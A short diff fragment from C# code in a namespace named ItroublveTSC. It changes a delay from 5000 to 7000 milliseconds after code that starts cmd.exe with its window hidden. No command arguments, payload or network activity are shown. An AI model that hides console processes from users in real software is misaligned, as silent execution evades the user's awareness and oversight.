@@ -147,7 +147,7 @@ namespace ItroublveTSC
                         CreateNoWindow = true,
                         FileName = "cmd.exe"
                     });
-                    Thread.Sleep(5000);
+                    Thread.Sleep(7000);
                 }
                 catch
                 {
